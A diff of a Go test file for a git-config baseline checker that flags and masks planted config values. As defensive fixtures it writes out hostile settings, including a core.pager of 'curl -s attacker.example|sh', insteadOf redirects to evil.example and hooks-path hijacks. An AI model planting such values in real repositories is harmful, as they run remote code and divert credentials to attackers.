@@ -5,7 +5,9 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"regexp"
 	"slices"
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -26,7 +28,7 @@ func runBaseline(cwd string, tty bool, in string, accept bool) baselineRun {
 
 func (b baselineRun) want(t *testing.T, code int, stdout, stderr string) {
 	t.Helper()
-	if b.code != code || b.stdout != stdout || b.stderr != stderr {
+	if b.code != code || squash(b.stdout) != squash(stdout) || b.stderr != stderr {
 		t.Fatalf("exit %d, stdout:\n%q\nstderr:\n%q\nwant exit %d, stdout:\n%q\nstderr:\n%q", b.code, b.stdout, b.stderr, code, stdout, stderr)
 	}
 }
@@ -40,13 +42,95 @@ func readFile(t *testing.T, path string) string {
 	return string(b)
 }
 
-func driftLine(disp, label, origin string) string {
-	return disp + " (" + label + ", " + Quote(origin) + ")\n"
+// spaces lets a test pin the layout and not the column padding;
+// TestRunBaselineLayout pins the padding.
+var spaces = regexp.MustCompile(` {2,}`)
+
+func squash(s string) string { return spaces.ReplaceAllString(s, " ") }
+
+const (
+	last     = "since the last baseline"
+	none     = "no baseline yet"
+	nextStep = "\nIf they're yours, record them: crew git-baseline --accept\n"
+)
+
+func entries(n int) string {
+	if n == 1 {
+		return "1 new entry"
+	}
+	return strconv.Itoa(n) + " new entries"
+}
+
+// grp is the rows set by one file, and where it is.
+func grp(label, rel string, rows ...string) string {
+	out := "\n"
+	for _, row := range rows {
+		out += "  " + row + "\n"
+	}
+	return out + "  in: " + label + " (" + rel + ")\n"
+}
+
+func mainGrp(rows ...string) string { return grp("main checkout", ".git/config", rows...) }
+
+// hidden is a row whose value is withheld behind its fingerprint.
+func hidden(k, reason, v string) string {
+	return ShowKey(k) + " " + hiddenNote(reason) + " sha256:" + sha8(v)
+}
+
+// cmdBlock is what follows the groups when something is withheld: why, and the
+// command that reads each key in the human's own terminal.
+func cmdBlock(keys ...string) string {
+	out := "\nHidden values stay off this screen: a planted value could carry a token or terminal escapes.\n" +
+		"See them safely (each byte prints as a character or an escape; each entry ends at \\0):\n"
+	var seen []string
+	for _, k := range keys {
+		if cmd := ownTerminalCmd(k); !slices.Contains(seen, cmd) {
+			seen = append(seen, cmd)
+			out += "  " + cmd + " | env LC_ALL=C od -An -c -v\n"
+		}
+	}
+	return out + "  (run these from each checkout or worktree that may set them)\n"
+}
+
+// listing is the header, the groups and, for the keys that need it, the block.
+func listing(r repo, n int, since, groups string, cmdKeys ...string) string {
+	out := "git-config baseline: " + entries(n) + " in " + strings.TrimSuffix(r.common, "/.git") + " (" + since + ")\n" + groups
+	if len(cmdKeys) > 0 {
+		out += cmdBlock(cmdKeys...)
+	}
+	return out
+}
+
+// execListing is the listing of exec values set in the main checkout's config.
+func execListing(r repo, since string, kv ...string) string {
+	var rows, keys []string
+	for i := 0; i < len(kv); i += 2 {
+		rows = append(rows, hidden(kv[i], "exec value", kv[i+1]))
+		keys = append(keys, kv[i])
+	}
+	return listing(r, len(rows), since, mainGrp(rows...), keys...)
+}
+
+func plainListing(r repo, rows ...string) string {
+	return listing(r, len(rows), last, mainGrp(rows...))
 }
 
 func noDrift(file string) string { return "git-config baseline " + file + ": no drift\n" }
 
-func prompt(file string) string { return "Accept these into the baseline " + file + "? type yes: " }
+func prompt(n int, withheld bool) string {
+	what := "this entry"
+	if n > 1 {
+		what = "these " + strconv.Itoa(n) + " entries"
+	}
+	if withheld {
+		return "\nRecord " + what + " as trusted? The sha256 values should match what you checked. Type yes: "
+	}
+	return "\nRecord " + what + " as trusted? Type yes: "
+}
+
+const emptyPrompt = "No guarded git config yet. Record an empty baseline as trusted? Type yes: "
+
+func accepted(file string) string { return "git-config baseline " + file + ": accepted\n" }
 
 const legacyTail = " — inspect and remove it; --accept never records a legacy entry\n"
 
@@ -97,12 +181,14 @@ func TestRunBaselineDrift(t *testing.T) {
 	r := newRepo(t)
 	r.config(t, "extensions.worktreeConfig", "true")
 	r.init(t)
-	wt, admin := r.addWorktree(t, "w")
+	wt, _ := r.addWorktree(t, "w")
 	r.config(t, "core.fsmonitor", "x")
 	run(t, wt, "config", "--worktree", "core.pager", "less")
 	runBaseline(wt, false, "", false).want(t, 1,
-		execPair(r, "core.fsmonitor", "x")+
-			withheldPair("core.pager", "exec value", "less", "worktree w", admin+"/config.worktree"), "")
+		listing(r, 2, last,
+			mainGrp(hidden("core.fsmonitor", "exec value", "x"))+
+				grp("worktree w", ".git/worktrees/w/config.worktree", hidden("core.pager", "exec value", "less")),
+			"core.fsmonitor", "core.pager")+nextStep, "")
 }
 
 func TestRunBaselinePredatesNoteBeforePairs(t *testing.T) {
@@ -111,7 +197,7 @@ func TestRunBaselinePredatesNoteBeforePairs(t *testing.T) {
 	r.config(t, "core.pager", "less")
 	r.config(t, "core.fsmonitor", "x")
 	runBaseline(r.main, false, "", false).want(t, 1,
-		predatesNote(r.baseline())+execPair(r, "core.fsmonitor", "x"), "")
+		predatesNote(r.baseline())+execListing(r, last, "core.fsmonitor", "x")+nextStep, "")
 }
 
 func TestRunBaselineAliasRewrite(t *testing.T) {
@@ -119,12 +205,8 @@ func TestRunBaselineAliasRewrite(t *testing.T) {
 	r.config(t, "remote.origin.url", "https://t@h.example/r")
 	r.init(t)
 	r.config(t, "url.https://evil.example/.insteadof", "https://t@h")
-	origin := r.common + "/config"
 	runBaseline(r.main, false, "", false).want(t, 1,
-		driftLine(ShowPair("url.https://evil.example/.insteadof", "https://t@h", nil), "main checkout", origin)+
-			"  rewritten by the alias above: "+
-			withheldLine("remote.origin.url", "an insteadOf alias rewrites it", "https://t@h.example/r", "main checkout", origin)+
-			ownTerminalLine("remote.origin.url", "remote.origin.url"), "")
+		aliasRewriteListing(r)+nextStep, "")
 }
 
 // A withheld line printed only by the alias rewrite still reaches --accept's note.
@@ -133,13 +215,16 @@ func TestRunBaselineAcceptAliasRewriteNotesWithheld(t *testing.T) {
 	r.config(t, "remote.origin.url", "https://t@h.example/r")
 	r.init(t)
 	r.config(t, "url.https://evil.example/.insteadof", "https://t@h")
-	origin := r.common + "/config"
 	runBaseline(r.main, true, "no\n", true).want(t, 1,
-		driftLine(ShowPair("url.https://evil.example/.insteadof", "https://t@h", nil), "main checkout", origin)+
-			"  rewritten by the alias above: "+
-			withheldLine("remote.origin.url", "an insteadOf alias rewrites it", "https://t@h.example/r", "main checkout", origin)+
-			ownTerminalLine("remote.origin.url", "remote.origin.url")+
-			withheldNote+prompt(r.baseline()), "crew: baseline unchanged\n")
+		aliasRewriteListing(r)+prompt(1, true), "crew: baseline unchanged\n")
+}
+
+// aliasRewriteListing is the alias entry, and the remote url it rewrites.
+func aliasRewriteListing(r repo) string {
+	return listing(r, 1, last, mainGrp(
+		ShowPair("url.https://evil.example/.insteadof", "https://t@h", nil),
+		hidden("remote.origin.url", "an insteadOf alias rewrites it", "https://t@h.example/r")+" (rewritten by url.https://evil.example/.insteadof)"),
+		"remote.origin.url")
 }
 
 func TestRunBaselineLegacy(t *testing.T) {
@@ -154,7 +239,8 @@ func TestRunBaselineLegacy(t *testing.T) {
 	runBaseline(r.main, false, "", false).want(t, 1,
 		"legacy file entry "+Quote(r.common+"/remotes/foo")+": new or changed from the baseline"+legacyTail+
 			"legacy symlink entry "+Quote(r.common+"/remotes/link")+": unsafe"+legacyTail+
-			"legacy directory entry "+Quote(r.common+"/branches/d")+": unsafe"+legacyTail, "")
+			"legacy directory entry "+Quote(r.common+"/branches/d")+": unsafe"+legacyTail+
+			"\nRemove the legacy entries above, then re-run: crew git-baseline\n", "")
 }
 
 func TestRunBaselineAcceptNo(t *testing.T) {
@@ -163,7 +249,7 @@ func TestRunBaselineAcceptNo(t *testing.T) {
 	before := readFile(t, r.baseline())
 	r.config(t, "core.fsmonitor", "x")
 	runBaseline(r.main, true, "no\n", true).want(t, 1,
-		execPair(r, "core.fsmonitor", "x")+withheldNote+prompt(r.baseline()),
+		execListing(r, last, "core.fsmonitor", "x")+prompt(1, true),
 		"crew: baseline unchanged\n")
 	if got := readFile(t, r.baseline()); got != before {
 		t.Fatalf("baseline changed: %q, want %q", got, before)
@@ -179,8 +265,8 @@ func TestRunBaselineAcceptYesMerges(t *testing.T) {
 	note := predatesNote(r.baseline())
 	// read -r: surrounding blanks trimmed, a final line without a newline still read.
 	runBaseline(r.main, true, " yes\t", true).want(t, 0,
-		note+execPair(r, "core.fsmonitor", "x")+execPair(r, "core.editor", "vi")+withheldNote+
-			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+		note+execListing(r, last, "core.fsmonitor", "x", "core.editor", "vi")+
+			prompt(2, true)+accepted(r.baseline()), "")
 	want := RedirectMark + "\x00core.editor\nvi\x00core.fsmonitor\nx\x00core.pager\nless\x00"
 	if got := readFile(t, r.baseline()); got != want {
 		t.Fatalf("baseline %q, want %q", got, want)
@@ -191,8 +277,7 @@ func TestRunBaselineAcceptYesMerges(t *testing.T) {
 func TestRunBaselineAcceptEmpty(t *testing.T) {
 	r := newRepo(t)
 	runBaseline(r.main, true, "yes\n", true).want(t, 0,
-		"no guarded git config yet — yes records an empty baseline\n"+prompt(r.baseline())+
-			"git-config baseline "+r.baseline()+": accepted\n", "")
+		emptyPrompt+accepted(r.baseline()), "")
 	if got := readFile(t, r.baseline()); got != RedirectMark+"\x00" {
 		t.Fatalf("baseline %q, want the marker only", got)
 	}
@@ -207,7 +292,7 @@ func TestRunBaselineAcceptRefusesLegacy(t *testing.T) {
 	writeFile(t, r.common+"/remotes/foo", "URL: https://h.example/r\n")
 	// #993: the refusal lands before the prompt — stdout carries no `type yes`.
 	runBaseline(r.main, true, "yes\n", true).want(t, 1,
-		execPair(r, "core.fsmonitor", "x")+
+		execListing(r, last, "core.fsmonitor", "x")+"\n"+
 			"legacy file entry "+Quote(r.common+"/remotes/foo")+": new or changed from the baseline"+legacyTail,
 		"crew: git-baseline --accept refuses while legacy remotes/branches entries are listed — remove them, then re-run\n")
 	if got := readFile(t, r.baseline()); got != before {
@@ -292,7 +377,7 @@ func TestRunBaselineHooksPathCanonicalized(t *testing.T) {
 	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
 	r.config(t, "core.hookspath", ".git/hooks-evil")
 	runBaseline(r.main, false, "", false).want(t, 1,
-		execPair(r, "core.hookspath", ".git/hooks-evil"), "")
+		execListing(r, last, "core.hookspath", ".git/hooks-evil")+nextStep, "")
 }
 
 // #557: a raw ESC/CR in a key or value prints escaped — it could otherwise
@@ -306,7 +391,7 @@ func TestRunBaselineEscapesWorkerBytes(t *testing.T) {
 	r.config(t, key, "cat")
 	got := runBaseline(r.main, false, "", false)
 	got.want(t, 1,
-		execPair(r, "filter.x.clean", value)+execPair(r, key, "cat"), "")
+		execListing(r, last, "filter.x.clean", value, key, "cat")+nextStep, "")
 	if strings.ContainsAny(got.stdout+got.stderr, "\x1b\r") {
 		t.Fatalf("raw control bytes reached the terminal: %q", got.stdout+got.stderr)
 	}
@@ -318,13 +403,13 @@ func TestRunBaselineAcceptWithoutBaseline(t *testing.T) {
 	const value = "/tmp/hit.sh"
 	r := newRepo(t)
 	r.config(t, "core.sshcommand", value)
-	line := execPair(r, "core.sshcommand", value) + withheldNote
-	runBaseline(r.main, true, "no\n", true).want(t, 1, line+prompt(r.baseline()), "crew: baseline unchanged\n")
+	line := execListing(r, none, "core.sshcommand", value) + prompt(1, true)
+	runBaseline(r.main, true, "no\n", true).want(t, 1, line, "crew: baseline unchanged\n")
 	if _, err := os.Stat(r.baseline()); err == nil {
 		t.Fatal("typed no recorded a baseline")
 	}
 	runBaseline(r.main, true, "yes\n", true).want(t, 0,
-		line+prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+		line+accepted(r.baseline()), "")
 	if got := readFile(t, r.baseline()); got != RedirectMark+"\x00core.sshcommand\n"+value+"\x00" {
 		t.Fatalf("baseline %q", got)
 	}
@@ -353,7 +438,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 			name:  "planted redirect",
 			drift: func(t *testing.T, r repo) { r.config(t, "url.https://evil.example/.insteadof", "https://github.com/") },
 			want: func(r repo) string {
-				return driftLine("url.https://evil.example/.insteadof=https://github.com/", "main checkout", r.common+"/config")
+				return plainListing(r, "url.https://evil.example/.insteadof=https://github.com/")
 			},
 			hosts: []string{"evil.example"},
 		},
@@ -363,7 +448,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 				r.config(t, "core.pager", "curl -s attacker.example|sh;: a@less")
 			},
 			want: func(r repo) string {
-				return execPair(r, "core.pager", "curl -s attacker.example|sh;: a@less")
+				return execListing(r, last, "core.pager", "curl -s attacker.example|sh;: a@less")
 			},
 			secrets: []string{"attacker.example"},
 		},
@@ -373,7 +458,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 				r.config(t, "core.pager", "x://curl attacker.example|sh;:@less")
 			},
 			want: func(r repo) string {
-				return execPair(r, "core.pager", "x://curl attacker.example|sh;:@less")
+				return execListing(r, last, "core.pager", "x://curl attacker.example|sh;:@less")
 			},
 			secrets: []string{"attacker.example"},
 		},
@@ -384,7 +469,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 				r.config(t, "remote.origin.url", "ssh://[evil.example]:22@github.com/o/r.git")
 			},
 			want: func(r repo) string {
-				return withheldPair("remote.origin.url", "outside the mask grammar", "ssh://[evil.example]:22@github.com/o/r.git", "main checkout", r.common+"/config")
+				return listing(r, 1, last, mainGrp(hidden("remote.origin.url", "outside the mask grammar", "ssh://[evil.example]:22@github.com/o/r.git")), "remote.origin.url")
 			},
 			secrets: []string{"evil.example"},
 		},
@@ -395,7 +480,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 				r.config(t, "remote.origin.url", "attacker.example:x@github.com:o/r.git")
 			},
 			want: func(r repo) string {
-				return withheldPair("remote.origin.url", "outside the mask grammar", "attacker.example:x@github.com:o/r.git", "main checkout", r.common+"/config")
+				return listing(r, 1, last, mainGrp(hidden("remote.origin.url", "outside the mask grammar", "attacker.example:x@github.com:o/r.git")), "remote.origin.url")
 			},
 			secrets: []string{"attacker.example"},
 		},
@@ -403,7 +488,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 			name:  "scheme-less http.proxy",
 			drift: func(t *testing.T, r repo) { r.config(t, "http.proxy", proxyRaw) },
 			want: func(r repo) string {
-				return driftLine("http.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw), "main checkout", r.common+"/config")
+				return plainListing(r, "http.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw))
 			},
 			hosts:   []string{"proxy.example"},
 			secrets: []string{"fakepass0686"},
@@ -417,12 +502,11 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 				r.config(t, "url."+redirectSub+".insteadof", "https://github.com/")
 			},
 			want: func(r repo) string {
-				origin := r.common + "/config"
-				return driftLine("remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", tokenURL), "main checkout", origin) +
-					driftLine("http.proxy="+fingerprinted("http://***@proxy.example:3128", proxyURL), "main checkout", origin) +
-					driftLine("http.https://p.example/.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw), "main checkout", origin) +
-					driftLine("url."+fingerprinted("https://***@evil.example/", redirectSub)+
-						".insteadof=https://github.com/", "main checkout", origin)
+				return plainListing(r,
+					"remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", tokenURL),
+					"http.proxy="+fingerprinted("http://***@proxy.example:3128", proxyURL),
+					"http.https://p.example/.proxy="+fingerprinted("***@proxy.example:3128", proxyRaw),
+					"url."+fingerprinted("https://***@evil.example/", redirectSub)+".insteadof=https://github.com/")
 			},
 			hosts:   []string{"github.com", "proxy.example", "evil.example"},
 			secrets: []string{"FAKETOKEN0686", "fakepass0686"},
@@ -436,7 +520,7 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 			r.init(t)
 			tc.drift(t, r)
 			got := runBaseline(r.main, false, "", false)
-			got.want(t, 1, tc.want(r), "")
+			got.want(t, 1, tc.want(r)+nextStep, "")
 			for _, host := range tc.hosts {
 				if !strings.Contains(got.stdout, host) {
 					t.Errorf("the host %s vanished from:\n%s", host, got.stdout)
@@ -454,14 +538,6 @@ func TestRunBaselineVerbatimAndMaskedValues(t *testing.T) {
 	}
 }
 
-// aliasPointer is the line that follows a withheld url.<alias>.insteadof key.
-func aliasPointer(alias string) string {
-	if alias == "" {
-		return ""
-	}
-	return "  url." + urlWithheld(alias) + ".insteadof" + ownTerminal("url."+alias+".insteadof") + "\n"
-}
-
 // #686: an insteadOf alias from any scope git reads — the main checkout's, or
 // the human's own global file — rewrites the remote url git contacts, so that
 // url is withheld rather than masked.
@@ -470,8 +546,8 @@ func TestRunBaselineAliasFromAnyScopeRewrites(t *testing.T) {
 	r := newRepo(t)
 	r.init(t)
 	r.config(t, "remote.origin.url", url)
-	line := withheldLine("remote.origin.url", "an insteadOf alias rewrites it", url, "main checkout", r.common+"/config")
-	want := line + ownTerminalLine("remote.origin.url", "remote.origin.url")
+	line := hidden("remote.origin.url", "an insteadOf alias rewrites it", url)
+	want := listing(r, 1, last, mainGrp(line), "remote.origin.url")
 	for _, alias := range []string{"", "git@"} {
 		r.config(t, "url."+alias+".insteadof", "https://")
 		disp := "url." + alias + ".insteadof"
@@ -479,16 +555,20 @@ func TestRunBaselineAliasFromAnyScopeRewrites(t *testing.T) {
 			disp = "url." + urlWithheld(alias) + ".insteadof"
 		}
 		// The alias is itself drift, and it reprints the url it rewrites.
+		// Only a withheld alias key needs a command of its own.
+		cmdKeys := []string{"remote.origin.url"}
+		if alias != "" {
+			cmdKeys = append(cmdKeys, "url."+alias+".insteadof")
+		}
 		runBaseline(r.main, false, "", false).want(t, 1,
-			want+driftLine(disp+"=https://", "main checkout", r.common+"/config")+
-				aliasPointer(alias)+
-				"  rewritten by the alias above: "+want, "")
+			listing(r, 2, last, mainGrp(line, disp+"=https://", line+" (rewritten by "+disp+")"),
+				cmdKeys...)+nextStep, "")
 		r.config(t, "--unset", "url."+alias+".insteadof")
 	}
 	global := filepath.Join(r.root, "gitconfig")
 	writeFile(t, global, "[url \"git@\"]\n\tpushInsteadOf = https://\n")
 	t.Setenv("GIT_CONFIG_GLOBAL", global)
-	runBaseline(r.main, false, "", false).want(t, 1, want, "")
+	runBaseline(r.main, false, "", false).want(t, 1, want+nextStep, "")
 }
 
 // #686: an alias only a linked worktree configures rewrites the main
@@ -496,17 +576,17 @@ func TestRunBaselineAliasFromAnyScopeRewrites(t *testing.T) {
 func TestRunBaselineWorktreeAliasUnmasksMainRemote(t *testing.T) {
 	const url = "https://evil.example:x@github.com/o/r.git"
 	r := newRepo(t)
-	wt, admin := r.addWorktree(t, "alias-wt")
+	wt, _ := r.addWorktree(t, "alias-wt")
 	r.init(t)
 	r.config(t, "extensions.worktreeconfig", "true")
 	run(t, wt, "config", "--worktree", "url..insteadof", "https://")
 	r.config(t, "remote.origin.url", url)
-	line := withheldLine("remote.origin.url", "an insteadOf alias rewrites it", url, "main checkout", r.common+"/config")
-	pointer := ownTerminalLine("remote.origin.url", "remote.origin.url")
+	line := hidden("remote.origin.url", "an insteadOf alias rewrites it", url)
 	runBaseline(r.main, false, "", false).want(t, 1,
-		line+pointer+
-			driftLine("url..insteadof=https://", "worktree alias-wt", admin+"/config.worktree")+
-			"  rewritten by the alias above: "+line+pointer, "")
+		listing(r, 2, last,
+			mainGrp(line, line+" (rewritten by url..insteadof)")+
+				grp("worktree alias-wt", ".git/worktrees/alias-wt/config.worktree", "url..insteadof=https://"),
+			"remote.origin.url")+nextStep, "")
 }
 
 // #686: an alias that lives only in the baseline still counts: git may restore
@@ -515,17 +595,16 @@ func TestRunBaselineBaselinedAliasRewrites(t *testing.T) {
 	const url = "https://evil.invalid:x@trusted.invalid/o/r.git"
 	r := newRepo(t)
 	r.init(t)
-	origin := r.common + "/config"
-	accepted := "git-config baseline " + r.baseline() + ": accepted\n"
-	alias := driftLine("url."+urlWithheld("git@")+".insteadof=https://", "main checkout", origin) + aliasPointer("git@")
+	alias := listing(r, 1, last, mainGrp("url."+urlWithheld("git@")+".insteadof=https://"), "url.git@.insteadof")
 	r.config(t, "url.git@.insteadof", "https://")
-	runBaseline(r.main, true, "yes\n", true).want(t, 0, alias+withheldNote+prompt(r.baseline())+accepted, "")
+	runBaseline(r.main, true, "yes\n", true).want(t, 0,
+		alias+"\nRecord this entry as trusted? Run the commands above first. Type yes: "+accepted(r.baseline()), "")
 	r.config(t, "--unset", "url.git@.insteadof")
 	r.config(t, "remote.origin.url", url)
 	// The alias is gone from the config; the baselined alias still rewrites.
-	remote := withheldPair("remote.origin.url", "an insteadOf alias rewrites it", url, "main checkout", origin)
-	runBaseline(r.main, false, "", false).want(t, 1, remote, "")
-	runBaseline(r.main, true, "yes\n", true).want(t, 0, remote+withheldNote+prompt(r.baseline())+accepted, "")
+	remote := listing(r, 1, last, mainGrp(hidden("remote.origin.url", "an insteadOf alias rewrites it", url)), "remote.origin.url")
+	runBaseline(r.main, false, "", false).want(t, 1, remote+nextStep, "")
+	runBaseline(r.main, true, "yes\n", true).want(t, 0, remote+prompt(1, true)+accepted(r.baseline()), "")
 	r.config(t, "url.git@.insteadof", "https://")
 	runBaseline(r.main, false, "", false).want(t, 0, noDrift(r.baseline()), "")
 }
@@ -539,8 +618,8 @@ func TestRunBaselineAcceptMasksScreenStoresFull(t *testing.T) {
 	r.config(t, "remote.origin.url", token)
 	got := runBaseline(r.main, true, "yes\n", true)
 	got.want(t, 0,
-		driftLine("remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", token), "main checkout", r.common+"/config")+
-			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+		plainListing(r, "remote.origin.url="+fingerprinted("https://***@github.com/o/r.git", token))+
+			prompt(1, false)+accepted(r.baseline()), "")
 	if strings.Contains(got.stdout, "FAKETOKEN0686") {
 		t.Fatalf("the token reached the screen:\n%s", got.stdout)
 	}
@@ -561,7 +640,7 @@ func TestRunBaselinePredatesNoteListsRedirectPair(t *testing.T) {
 	writeFile(t, r.baseline(), "")
 	r.config(t, "remote.origin.url", "https://x.example/r.git")
 	runBaseline(r.main, false, "", false).want(t, 1, predatesNote(r.baseline())+
-		driftLine("remote.origin.url=https://x.example/r.git", "main checkout", r.common+"/config"), "")
+		plainListing(r, "remote.origin.url=https://x.example/r.git")+nextStep, "")
 }
 
 // #678: --accept records the redirect marker, so the note never comes back.
@@ -571,8 +650,8 @@ func TestRunBaselineAcceptRecordsRedirectMark(t *testing.T) {
 	r.config(t, "remote.origin.url", "https://x.example/r.git")
 	runBaseline(r.main, true, "yes\n", true).want(t, 0,
 		predatesNote(r.baseline())+
-			driftLine("remote.origin.url=https://x.example/r.git", "main checkout", r.common+"/config")+
-			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+			plainListing(r, "remote.origin.url=https://x.example/r.git")+
+			prompt(1, false)+accepted(r.baseline()), "")
 	recs, err := ReadBaseline(r.baseline())
 	if err != nil {
 		t.Fatal(err)
@@ -590,8 +669,8 @@ func TestRunBaselineAcceptRepairsLoneNUL(t *testing.T) {
 	writeFile(t, r.baseline(), "\x00")
 	r.config(t, "core.fsmonitor", "x")
 	runBaseline(r.main, true, "yes\n", true).want(t, 0,
-		predatesNote(r.baseline())+execPair(r, "core.fsmonitor", "x")+withheldNote+
-			prompt(r.baseline())+"git-config baseline "+r.baseline()+": accepted\n", "")
+		predatesNote(r.baseline())+execListing(r, last, "core.fsmonitor", "x")+
+			prompt(1, true)+accepted(r.baseline()), "")
 	recs, err := ReadBaseline(r.baseline())
 	if err != nil {
 		t.Fatal(err)
@@ -629,7 +708,7 @@ func TestRunBaselineAcceptWritesOnlyShownPairs(t *testing.T) {
 	var planted int
 	for _, rec := range recs {
 		if k, v, ok := strings.Cut(rec, "\n"); ok && k == "core.fsmonitor" {
-			if !strings.Contains(got.stdout, "[sha256:"+sha8(v)+"]") {
+			if !strings.Contains(got.stdout, "sha256:"+sha8(v)) {
 				t.Fatalf("recorded a pair it never displayed: %q\n%s", rec, got.stdout)
 			}
 			planted++
@@ -649,35 +728,19 @@ func TestRunBaselineAcceptWritesOnlyShownPairs(t *testing.T) {
 func TestRunBaselineWithheldKeyPointsToOwnTerminal(t *testing.T) {
 	r := newRepo(t)
 	r.init(t)
-	r.config(t, "http.https://u:tok@[::1]/.proxy", "proxy.example:3128")
-	kd := "http." + urlWithheld("https://u:tok@[::1]/") + ".proxy"
+	const key = "http.https://u:FAKETOKEN1468b@[::1]/.proxy"
+	r.config(t, key, "proxy.example:3128")
+	kd := "http." + urlWithheld("https://u:FAKETOKEN1468b@[::1]/") + ".proxy"
 	got := runBaseline(r.main, false, "", false)
 	got.want(t, 1,
-		driftLine(kd+"=proxy.example:3128", "main checkout", r.common+"/config")+
-			"  "+kd+` — check it in your own terminal (od shows each byte as a character or an escape; each entry ends at \0), from each checkout or worktree that may set it: git config -z --show-origin --get-regexp `+Quote(`^http\.`)+" | env LC_ALL=C od -An -c -v\n", "")
-	if strings.Contains(got.stdout+got.stderr, "tok") {
+		listing(r, 1, last, mainGrp(kd+"=proxy.example:3128"), key)+nextStep, "")
+	if strings.Contains(got.stdout+got.stderr, "FAKETOKEN1468b") {
 		t.Fatalf("userinfo leaked:\n%s%s", got.stdout, got.stderr)
 	}
+	if !strings.Contains(got.stdout, "  git config -z --show-origin --get-regexp \\^http\\\\. | env LC_ALL=C od -An -c -v\n") {
+		t.Fatalf("the regexp command is missing:\n%s", got.stdout)
+	}
 }
-
-// withheldLine is a listed pair whose value is withheld behind its fingerprint.
-func withheldLine(kd, reason, v, label, origin string) string {
-	return driftLine(kd+": value withheld ("+reason+") [sha256:"+sha8(v)+"]", label, origin)
-}
-
-func ownTerminalLine(kd, k string) string { return "  " + kd + ownTerminal(k) + "\n" }
-
-// withheldPair is the withheld line of k=v and the pointer under it.
-func withheldPair(k, reason, v, label, origin string) string {
-	return withheldLine(ShowKey(k), reason, v, label, origin) + ownTerminalLine(ShowKey(k), k)
-}
-
-// execPair is withheldPair for an exec value in the main checkout's config.
-func execPair(r repo, k, v string) string {
-	return withheldPair(k, "exec value", v, "main checkout", r.common+"/config")
-}
-
-const withheldNote = "withheld above: type yes only if a plain `crew git-baseline` listing showed the same sha256 for each, and you then checked each value with the git config command under it\n"
 
 func TestRunBaselineWithholdsCredentialedValues(t *testing.T) {
 	const (
@@ -686,7 +749,6 @@ func TestRunBaselineWithholdsCredentialedValues(t *testing.T) {
 		aliasKey  = "url.x.pushinsteadof"
 		hasconfig = "includeif.hasconfig:remote.*.url:https://u:" + token + "@h.example/**.path"
 	)
-	regexpPointer := ` — check it in your own terminal (od shows each byte as a character or an escape; each entry ends at \0), from each checkout or worktree that may set it: git config -z --show-origin --get-regexp ` + Quote(`^includeif\.`) + " | env LC_ALL=C od -An -c -v"
 	for _, tc := range []struct {
 		name      string
 		pre, post func(t *testing.T, r repo)
@@ -696,43 +758,34 @@ func TestRunBaselineWithholdsCredentialedValues(t *testing.T) {
 			r.config(t, "remote.origin.url", "https://u:"+token+"@github.com/o/r.git")
 		}, func(t *testing.T, r repo) { r.config(t, aliasKey, "https://") },
 			func(r repo) string {
-				origin := r.common + "/config"
-				return driftLine(aliasKey+"=https://", "main checkout", origin) +
-					"  rewritten by the alias above: " +
-					withheldLine("remote.origin.url", "an insteadOf alias rewrites it", "https://u:"+token+"@github.com/o/r.git", "main checkout", origin) +
-					ownTerminalLine("remote.origin.url", "remote.origin.url")
+				return listing(r, 1, last, mainGrp(aliasKey+"=https://",
+					hidden("remote.origin.url", "an insteadOf alias rewrites it", "https://u:"+token+"@github.com/o/r.git")+" (rewritten by "+aliasKey+")"),
+					"remote.origin.url")
 			}},
 		{"remote url outside the mask grammar", nil, func(t *testing.T, r repo) {
 			r.config(t, "remote.origin.url", "https://u:"+token+"@git_srv/r.git")
 		}, func(r repo) string {
-			return withheldLine("remote.origin.url", "outside the mask grammar", "https://u:"+token+"@git_srv/r.git", "main checkout", r.common+"/config") +
-				ownTerminalLine("remote.origin.url", "remote.origin.url")
+			return listing(r, 1, last, mainGrp(hidden("remote.origin.url", "outside the mask grammar", "https://u:"+token+"@git_srv/r.git")), "remote.origin.url")
 		}},
 		{"proxy outside the mask grammar", nil, func(t *testing.T, r repo) {
 			r.config(t, "http.proxy", "http://u:"+token+"@[::1]:3128")
 		}, func(r repo) string {
-			return withheldLine("http.proxy", "outside the mask grammar", "http://u:"+token+"@[::1]:3128", "main checkout", r.common+"/config") +
-				ownTerminalLine("http.proxy", "http.proxy")
+			return listing(r, 1, last, mainGrp(hidden("http.proxy", "outside the mask grammar", "http://u:"+token+"@[::1]:3128")), "http.proxy")
 		}},
 		{"exec credential helper", nil, func(t *testing.T, r repo) {
 			r.config(t, "credential.helper", helper)
 		}, func(r repo) string {
-			return withheldLine("credential.helper", "exec value", helper, "main checkout", r.common+"/config") +
-				ownTerminalLine("credential.helper", "credential.helper")
+			return execListing(r, last, "credential.helper", helper)
 		}},
 		{"exec credential helper under a url subsection", nil, func(t *testing.T, r repo) {
 			r.config(t, "credential.https://h.example.helper", helper)
 		}, func(r repo) string {
-			k := "credential.https://h.example.helper"
-			return withheldLine(ShowKey(k), "exec value", helper, "main checkout", r.common+"/config") +
-				ownTerminalLine(ShowKey(k), k)
+			return execListing(r, last, "credential.https://h.example.helper", helper)
 		}},
 		{"hasconfig include pattern with userinfo", nil, func(t *testing.T, r repo) {
 			r.config(t, hasconfig, filepath.Join(r.root, "nonexistent.cfg"))
 		}, func(r repo) string {
